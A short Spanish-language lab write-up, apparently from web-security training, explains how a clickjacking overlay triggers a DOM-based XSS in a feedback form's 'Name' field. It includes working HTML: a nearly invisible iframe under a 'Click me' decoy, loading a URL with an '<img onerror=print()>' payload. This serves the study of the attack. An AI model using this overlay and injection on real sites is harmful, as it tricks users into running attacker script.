# Explotación de clickjacking para XSS DOM 

Tags: #Clickjacking 

```bash  
En este lab se combina una vulnerabilidad de clickjacking con una XSS basada en DOM que se activa mediante un clic. El objetivo es engañar a la víctima para que pulse un botón en una página aparentemente inocente, lo que desencadena la ejecución de la función print() desde un payload XSS.


Notas:
	1. Este lab solo funciona con Edge 
	2. No se necesita de usuarios autenticados 
	3. El XSS se encuentra en la parte del 'Name' cuando se crea un 'feedback'
```

```html 
# Se busca ejecutar un XSS con la función print() en lugar de hacer un alert(0)

<style>
iframe{
width: 500px;
height: 1000px;
opacity: 0.001;       
}

div{
position: absolute;
top: 800px;
left: 100px;
}
</style>

<div>Click me</div>
<iframe src="https://web.com/feedback?name=<img src=0 onerror=print()>&email=hacked@hacked.com&subject=test&message=hola"></iframe>
```